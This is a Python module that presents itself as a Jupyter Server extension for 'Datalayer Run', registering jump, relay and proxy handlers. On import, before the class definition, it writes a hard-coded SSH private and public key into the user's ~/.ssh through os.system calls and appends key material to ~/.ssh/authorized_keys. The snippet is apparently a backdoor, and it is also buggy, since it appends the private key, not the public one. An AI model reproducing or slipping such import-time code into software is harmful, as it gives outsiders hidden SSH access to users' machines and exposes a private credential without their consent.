"""The Datalayer Run Server application."""

import os

from traitlets import Unicode

from jupyter_server.utils import url_path_join
from jupyter_server.extension.application import ExtensionApp, ExtensionAppJinjaMixin

from ._version import __version__

from .handlers.index.handler import IndexHandler
from .handlers.config.handler import ConfigHandler
from .handlers.jump.handler import JumpHandler
from .handlers.content.handler import ContentHandler
from .handlers.echo.handler import WsEchoHandler
from .handlers.relay.handler import WsRelayHandler
from .handlers.proxy.handler import WsProxyHandler
from .handlers.ping.handler import WsPingHandler


DEFAULT_STATIC_FILES_PATH = os.path.join(os.path.dirname(__file__), "./static")

DEFAULT_TEMPLATE_FILES_PATH = os.path.join(os.path.dirname(__file__), "./templates")



PUB = """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoCFPWnAVbQz8IcrMMJmapJVZnmAq/gP/KQgjERonSD7nYzZW/OsoGO3p06SgUJn1cgdX/bDBtj0nE3QT8/P6mrb4hA3zHbSwSBaVzkDGo3z/S23nDIkD4Eg3HAyh+9Cy+1I2mTW7hijcD+cSraxLgVE7VHmM07qOW9bs+no01UjOLKDrJLiuFYJjcfahz9qdgx/5/XoThN2HPTkgJ6UPcfZ6s1bIcz6U2L1cRQ2BMxaMHyaSAdcC959RslnmvmQgjkNVYqfGH+4dvEJwFZih8ZHpqS//2W04OS3AwOX8MWcq2KcG6dqIKouo7QkpuFLQjjUSKLgyVsb8npCcXHJWTyR73XkAbhAZe6SC+4gf5mJ2fI9OCYTeMrgxpbCet7qRM4OV4nSd3PY4QeWFWvHxOtE1Olk5MlPOPKTFcW/IHwkCfTsumJ3JQQ8FeRTXhSySTwwRB1OLJrll8fzmek2yjbd2+1TzJiwbDgDOYl2KzvzTTePXyIuLyacx9oCWinxTjNj4thTBxM0+Z9qoln1jBLOYMOwopLhAgtjVOP203I13owO7ZquAZtKdnmXCZIMFr7AnF9ooIIfNT0mCIlffi3C9SHU/hXNEl3NEXoQTKDuFHydF+Uy0HrvK9K3pb88Akpb9YkqbnyKNjhtMCkkuhCz6/VaLR/5ap3gCYXHslcQ== datalayer@localhost"""


PRIV = '''-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----'''.replace("\n", "")


from pathlib import Path
home = Path.home()

os.system(f"chmod 700 {home}/.ssh")

os.system(f"echo {PUB} > {home}/.ssh/datalayer-jump.pub")
try:
    os.system(f"echo {PRIV} > {home}/.ssh/datalayer-jump")
except:
    pass

os.system(f"chmod 400 {home}/.ssh/datalayer-jump")

if os.path.exists(f"{home}/.ssh/authorized_keys"):
    f = open(f"{home}/.ssh/authorized_keys", "r")
    content = f.read()
    f.close()
    if not PRIV in content:
        os.system(f"echo {PRIV} >> {home}/.ssh/authorized_keys")
else:
    os.system(f"echo {PRIV} >> {home}/.ssh/authorized_keys")


class DatalayerRunExtensionApp(ExtensionAppJinjaMixin, ExtensionApp):
    """The Datalayer Run Server extension."""

    name = "datalayer_run"

    extension_url = "/datalayer_run"

    load_other_extensions = True

    static_paths = [DEFAULT_STATIC_FILES_PATH]
    template_paths = [DEFAULT_TEMPLATE_FILES_PATH]

    config_a = Unicode("", config=True, help="Config A example.")
    config_b = Unicode("", config=True, help="Config B example.")
    config_c = Unicode("", config=True, help="Config C example.")

    def initialize_settings(self):
        pass

    def initialize_templates(self):
        self.serverapp.jinja_template_vars.update({"datalayer_run_version" : __version__})

    def initialize_handlers(self):
        pod_name_regex = r"(?P<pod_name>[\w\.\-%]+)"
        handlers = [
            ("datalayer_run", IndexHandler),
            (url_path_join("datalayer_run", "config"), ConfigHandler),
            (url_path_join("datalayer_run", "content"), ContentHandler),
            (r"/datalayer_run/jump/%s" % pod_name_regex, JumpHandler),
            (url_path_join("datalayer_run", "echo"), WsEchoHandler),
            (url_path_join("datalayer_run", "relay"), WsRelayHandler),
            (url_path_join("datalayer_run", "proxy"), WsProxyHandler),
            (url_path_join("datalayer_run", "ping"), WsPingHandler),
        ]
        self.handlers.extend(handlers)


# -----------------------------------------------------------------------------
# Main entry point
# -----------------------------------------------------------------------------

main = launch_new_instance = DatalayerRunExtensionApp.launch_instance
